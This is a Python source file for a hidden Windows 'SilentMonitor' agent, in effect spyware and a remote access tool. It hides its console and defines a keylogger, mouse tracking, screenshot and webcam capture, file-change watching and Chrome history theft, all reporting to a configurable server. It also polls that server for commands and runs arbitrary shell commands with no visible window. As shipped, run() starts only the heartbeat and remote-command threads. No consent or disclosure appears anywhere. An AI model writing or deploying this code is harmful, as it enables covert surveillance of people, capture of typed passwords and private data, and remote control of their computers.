import sys
import os
import ctypes
import subprocess
import psutil
import requests
import time
from PIL import ImageGrab
import io
import base64
from datetime import datetime
import socket
import threading
import json
from pathlib import Path

if sys.platform == 'win32':
    import win32gui
    import win32con
    import win32api
    import win32process
    from pynput import keyboard, mouse
    
    # Hide console window
    def hide_console():
        try:
            window = ctypes.windll.kernel32.GetConsoleWindow()
            if window:
                ctypes.windll.user32.ShowWindow(window, 0)
        except:
            pass
    
    hide_console()

# Configuration
SERVER_URL = "http://127.0.0.1:5000"  # Change this
API_KEY = "dev"  # Change this
SCREENSHOT_INTERVAL = 300  # Every 5 minutes
HEARTBEAT_INTERVAL = 30  # Every 30 seconds

class SilentMonitor:
    def __init__(self):
        self.pc_id = socket.gethostname()
        self.running = True
        self.keylog_buffer = []
        self.file_changes = []
        self.monitored_folders = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads")
        ]
        
    def get_system_info(self):
        """Gather comprehensive system information"""
        return {
            'pc_id': self.pc_id,
            'cpu': psutil.cpu_percent(interval=1),
            'ram': psutil.virtual_memory().percent,
            'ram_used': f"{psutil.virtual_memory().used / (1024**3):.1f}GB",
            'ram_total': f"{psutil.virtual_memory().total / (1024**3):.1f}GB",
            'disk_used': f"{psutil.disk_usage('/').used / (1024**3):.1f}GB",
            'disk_total': f"{psutil.disk_usage('/').total / (1024**3):.1f}GB",
            'uptime': int(time.time() - psutil.boot_time()),
            'active_window': self.get_active_window(),
            'running_apps': self.get_running_apps(),
            'network_connections': len(psutil.net_connections()),
            'timestamp': datetime.now().isoformat()
        }
    
    def get_active_window(self):
        """Get currently active window"""
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return "Unknown"
    
    def get_running_apps(self):
        """Get list of running applications"""
        apps = []
        for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_percent']):
            try:
                if proc.info['cpu_percent'] > 0 or proc.info['memory_percent'] > 1:
                    apps.append({
                        'name': proc.info['name'],
                        'cpu': proc.info['cpu_percent'],
                        'memory': round(proc.info['memory_percent'], 2)
                    })
            except:
                pass
        return sorted(apps, key=lambda x: x['cpu'], reverse=True)[:10]
    
    def capture_screenshot(self):
        """Capture and encode screenshot"""
        try:
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            return base64.b64encode(buffer.getvalue()).decode()
        except:
            return None
    
    def capture_webcam(self):
        """Capture image from webcam"""
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode()
        except:
            pass
        return None
    
    def start_keylogger(self):
        """Start keylogging in background thread"""
        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                char = f'[{key.name}]'
            
            self.keylog_buffer.append({
                'key': char,
                'window': self.get_active_window(),
                'timestamp': datetime.now().isoformat()
            })
            
            # Send keylog every 50 keys or 5 minutes
            if len(self.keylog_buffer) >= 50:
                self.send_keylogs()
        
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
    
    def start_mouse_tracker(self):
        """Track mouse clicks and positions"""
        def on_click(x, y, button, pressed):
            if pressed:
                self.send_data('/mouse_event', {
                    'x': x,
                    'y': y,
                    'button': str(button),
                    'window': self.get_active_window()
                })
        
        listener = mouse.Listener(on_click=on_click)
        listener.daemon = True
        listener.start()
    
    def monitor_file_changes(self):
        """Monitor file system changes"""
        import watchdog.observers
        from watchdog.events import FileSystemEventHandler
        
        class ChangeHandler(FileSystemEventHandler):
            def __init__(self, monitor):
                self.monitor = monitor
            
            def on_modified(self, event):
                if not event.is_directory:
                    self.monitor.file_changes.append({
                        'type': 'modified',
                        'path': event.src_path,
                        'timestamp': datetime.now().isoformat()
                    })
            
            def on_created(self, event):
                if not event.is_directory:
                    self.monitor.file_changes.append({
                        'type': 'created',
                        'path': event.src_path,
                        'timestamp': datetime.now().isoformat()
                    })
            
            def on_deleted(self, event):
                if not event.is_directory:
                    self.monitor.file_changes.append({
                        'type': 'deleted',
                        'path': event.src_path,
                        'timestamp': datetime.now().isoformat()
                    })
        
        try:
            observer = watchdog.observers.Observer()
            handler = ChangeHandler(self)
            
            for folder in self.monitored_folders:
                if os.path.exists(folder):
                    observer.schedule(handler, folder, recursive=True)
            
            observer.daemon = True
            observer.start()
        except:
            pass
    
    def get_browser_history(self):
        """Extract recent browser history (Chrome example)"""
        try:
            import sqlite3
            history_db = os.path.join(
                os.getenv('LOCALAPPDATA'),
                r'Google\Chrome\User Data\Default\History'
            )
            
            # Copy database (can't read while Chrome is open)
            temp_db = os.path.join(os.getenv('TEMP'), 'hist_temp.db')
            import shutil
            shutil.copy2(history_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 50
            """)
            
            history = []
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1],
                    'visits': row[2]
                })
            
            conn.close()
            os.remove(temp_db)
            return history
        except:
            return []
    
    def send_data(self, endpoint, data):
        """Send data to server"""
        try:
            data['pc_id'] = self.pc_id
            data['timestamp'] = datetime.now().isoformat()
            requests.post(
                f"{SERVER_URL}{endpoint}",
                json=data,
                headers={'Authorization': f'Bearer {API_KEY}'},
                timeout=10
            )
        except:
            pass
    
    def send_keylogs(self):
        """Send accumulated keylog data"""
        if self.keylog_buffer:
            self.send_data('/keylogs', {'logs': self.keylog_buffer})
            self.keylog_buffer = []
    
    def send_file_changes(self):
        """Send file system changes"""
        if self.file_changes:
            self.send_data('/file_changes', {'changes': self.file_changes})
            self.file_changes = []
    
    def heartbeat_loop(self):
        """Regular heartbeat to server"""
        while self.running:
            try:
                data = self.get_system_info()
                self.send_data('/heartbeat', data)
            except:
                pass
            time.sleep(HEARTBEAT_INTERVAL)
    
    def screenshot_loop(self):
        """Regular screenshot capture"""
        while self.running:
            try:
                screenshot = self.capture_screenshot()
                if screenshot:
                    self.send_data('/screenshot', {'image': screenshot})
            except:
                pass
            time.sleep(SCREENSHOT_INTERVAL)
    
    def periodic_tasks(self):
        """Periodic data collection"""
        while self.running:
            try:
                # Send keylogs every 5 minutes
                self.send_keylogs()
                
                # Send file changes
                self.send_file_changes()
                
                # Send browser history every 30 minutes
                if int(time.time()) % 1800 < 60:
                    history = self.get_browser_history()
                    if history:
                        self.send_data('/browser_history', {'history': history})
                
            except:
                pass
            
            time.sleep(300)  # Every 5 minutes
    
    def check_commands(self):
        """Check for remote commands"""
        while self.running:
            try:
                response = requests.get(
                    f"{SERVER_URL}/commands/{self.pc_id}",
                    headers={'Authorization': f'Bearer {API_KEY}'},
                    timeout=10
                )
                
                if response.status_code == 200:
                    commands = response.json()
                    for cmd in commands:
                        self.execute_command(cmd)
            except:
                pass
            
            time.sleep(30)
    
    def execute_command(self, command):
        """Execute remote commands"""
        cmd_type = command.get('type')
        
        if cmd_type == 'screenshot':
            screenshot = self.capture_screenshot()
            if screenshot:
                self.send_data('/screenshot', {'image': screenshot, 'on_demand': True})
        
        elif cmd_type == 'webcam':
            webcam = self.capture_webcam()
            if webcam:
                self.send_data('/webcam', {'image': webcam})
        
        elif cmd_type == 'execute':
            try:
                result = subprocess.run(
                    command['cmd'],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
                )
                self.send_data('/command_result', {
                    'output': result.stdout,
                    'error': result.stderr
                })
            except:
                pass
        
        elif cmd_type == 'get_files':
            try:
                path = command.get('path', os.path.expanduser('~'))
                files = []
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    files.append({
                        'name': item,
                        'is_dir': os.path.isdir(item_path),
                        'size': os.path.getsize(item_path) if os.path.isfile(item_path) else 0
                    })
                self.send_data('/file_list', {'path': path, 'files': files})
            except:
                pass
    
    def run(self):
        """Main execution: Heartbeat and Command Checking only"""
        # Wait for system to stabilize
        time.sleep(60)
        
        # Send startup notification
        self.send_data('/event', {'event': 'startup'})
        
        # Start ONLY the heartbeat and command checking background threads
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.check_commands, daemon=True).start()
        
        # Keep main thread alive
        while self.running:
            time.sleep(60)

if __name__ == "__main__":
    monitor = SilentMonitor()
    monitor.run()
